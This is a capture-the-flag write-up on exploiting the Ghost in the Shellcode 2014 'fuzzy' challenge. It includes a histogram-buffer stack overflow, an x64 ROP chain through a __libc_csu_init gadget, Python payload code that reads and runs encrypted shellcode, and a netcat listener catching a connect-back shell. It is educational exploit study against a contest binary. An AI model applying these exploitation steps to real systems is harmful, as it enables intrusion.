Title: Ghost in the Shellcode 2014 - <code>fuzzy</code>
Date: 2014-01-19
Tags: ctf, exploitation

tl;dr - `fuzzy` is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
buckets past the end of the buffer if non ascii text is provided, allowing us to
rop. Binary and exploit available <a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz">here</a>.
Cross post from <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146">PPP
blog</a>.

## The program ##

`fuzzy` is a "super secure parsing engine", that includes a histogram function:
 
    :::console
    $ nc fuzzy.2014.ghostintheshellcode.com 4141
    Welcome to the super secure parsing engine!
    Please select a parser!
    
    1) Sentence histogram
    2) Sorted characters (ascending)
    3) Sorted characters (decending)
    4) Sorted ints (ascending)
    5) Sorted ints (decending
    6) global_find numbers in string
    1
    Enter a series of characters
    hello
     :0	!:0	":0	#:0	$:0	
    %:0	&:0	':0	(:0	):0	
	... <snip> ...
    a:0	b:0	c:0	d:0	e:1	
    f:0	g:0	h:1	i:0	j:0	
    k:0	l:2	m:0	n:0	o:1	
    p:0	q:0	r:0	s:0	t:0	
    u:0	v:0	w:0	x:0	y:0	
    z:0	{:0	|:0	}:0	

As you can see, it computes a histogram of the input. This histogram
is constructed using a buffer that is on the stack, so if we send it
non-ascii text we can write to the stack. By modifying the saved `ebp`,
we can point the stack to a buffer we control. 

Unfortunately, this is a bit challenging to figure out because all 
the interesting functions are encrypted. Fortunately for us, the "encryption"
is just bitwise not. Using our favorite hex editor, we make a new binary with 
the decrypted functions to reverse.

With control of the stack, we get control over rip and can ROP.
We will use the `callFunction` function, which decrypts a function
into an executable page and then runs it. Our goal will be to `read` encrypted shellcode
into a known location (there is a convenient buffer `dontcollide` in the data
section that is never used), then invoke `callFunction` to run our shellcode. 
Unfortunately, since this is x64, we need to find a good gadget to be able to
control registers and call functions. Luckily, there is a good gadget in 
`__libc_csu_init`:

    :::nasm
    loc_401790:                             ; CODE XREF: __libc_csu_init+64j
                    mov     rdx, r13
                    mov     rsi, r14
                    mov     edi, r15d
                    call    qword ptr [r12+rbx*8]
                    add     rbx, 1
                    cmp     rbx, rbp
                    jnz     short loc_401790
    
    loc_4017A6:                             ; CODE XREF: __libc_csu_init+4Aj
                    mov     rbx, [rsp+8]
                    mov     rbp, [rsp+10h]
                    mov     r12, [rsp+18h]
                    mov     r13, [rsp+20h]
                    mov     r14, [rsp+28h]
                    mov     r15, [rsp+30h]
                    add     rsp, 38h
                    retn
					
This gadget allows us to control the first three  registers we need an call 
anything we have function pointer to. The program uses a large function pointer table to enable
the encrypted functions to call library functions, so we have pointers to many
library functions. Unfortunately, we do *not* have a pointer to `readAll`, so we
cannot use it with our gadget. Furthermore, our gadget only controls 3 arguments,
so we cannot easily use `recv`. Lastly, we cannot use the encrypted `my_readAll`
function (that we have a pointer to) because it reads its arguments out of a
buffer and we don't have an easy way to call functions with a buffer we control 
as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
with 3 arguments:

    :::python
    # Assumes rip points to loc_4017A6.
    def call(function_ptr, arg0, arg1, arg2):
	  # Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to
	  # loc_4017A6 for repeated calls.
	  #      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi
      return pack(0xdeadbeef) + pack(0) + pack(1) + pack(function_ptr) + pack(arg2) + pack(arg1) + pack(arg0) + pack(__libc_csu_init_gadget)

Instead, we make a function pointer to `readAll` in the data section that we can use our
gadget.
We call `memset` 4 times, once for each distinct byte in
the the address of `readAll`, and make `dontcollide` a pointer to `readAll`.

    :::python
    # Set dontcollide to be a function pointer to readAll (0x4013cb).
    payload += call(memset_fptr, dontcollide, 0, 8)
    payload += call(memset_fptr, dontcollide, 0xcb, 1)
    payload += call(memset_fptr, dontcollide + 1, 0x13, 1)
    payload += call(memset_fptr, dontcollide + 2, 0x40, 1)
 
We then can use our gadget to call `readAll`, 
reading the encrypted shellcode into `dontcollide`, and then again to call
`callFunction`, executing our shellcode. 

    :::python
    # Read the shellcode into a buffer. The socket to read from is 4.
    payload += call(dontcollide, 4, dontcollide, 0x400)
    
    # Call our shellcode.
    payload += call(callEncryptedFunction_fptr, dontcollide, 0, 0)

We grab some connect back shellcode 
and get a shell:

    :::console
    ~% python fuzzy.py                                           [console 1]
    ~% nc -l 16705                                               [console 2]
    cat key.txt
    key is: fuzzingIsFun2 
